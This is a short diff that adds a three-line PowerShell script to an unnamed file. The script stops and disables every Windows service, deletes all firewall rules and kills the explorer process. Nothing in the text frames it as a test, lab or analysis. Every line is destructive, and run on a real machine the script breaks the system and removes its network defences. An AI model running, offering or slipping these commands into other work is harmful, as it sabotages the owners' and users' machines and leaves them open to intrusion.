@@ -1,0 +1,3 @@
+get-service | set-service -status stopped -StartupType disable
+get-netfirewallrule | Remove-NetFirewallRule
+stop-process -name "explorer"
